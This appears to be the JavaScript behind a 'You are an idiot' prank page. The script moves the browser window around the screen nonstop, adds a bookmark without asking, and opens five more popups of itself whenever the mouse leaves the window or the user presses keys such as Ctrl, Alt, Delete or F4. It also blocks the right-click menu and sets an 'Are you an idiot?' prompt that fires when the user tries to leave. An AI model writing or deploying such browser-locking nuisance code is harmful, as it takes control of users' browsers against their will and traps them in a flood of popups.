function playVideo() {
		    document.getElementById("youare-video").muted = false;
}

function bookmark() {
	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
		var url = "lol.html";
		var title = "Idiot!";
		
		window.external.AddFavorite(url, title);
	}
}

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function proCreate() {	
	for (var i = 0; i < 5; i++) {
		setTimeout(() => {
		openWindow('lol.html');

		}, 1000);

	}
}

function newXlt() {
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
	window.focus();
}

function fOff(){
	flagRun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) newXlt();    
	if (xPos < 0) newXrt();
    
	if (yPos > screen.height - 330) newYup(); 		
	if (yPos < 0) newYdn();
    
	if (flagRun == 1) {
        window.moveTo(xPos, yPos);
        setTimeout('playBall()', 1);
    }
}

/* [Oct 2021] Better code. */
window.onload = function () {
	flagRun = 1;
	
	playBall();
	bookmark(); // Internet Explorer only (what a piece of shit)
	
	return true;
}

window.onmouseout = function () {
	proCreate();

	return null;
};

window.oncontextmenu = function() {
	
	return false;
}

window.onkeydown = function() {	
	var keyCode = event.keyCode;
	
	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
		alert("You are an idiot!"); 
		proCreate();
	}
	
	return null;
}

window.onbeforeunload = function() {
    return "Are you an idiot?";
};
/* [Oct 2021] End of amendments. */
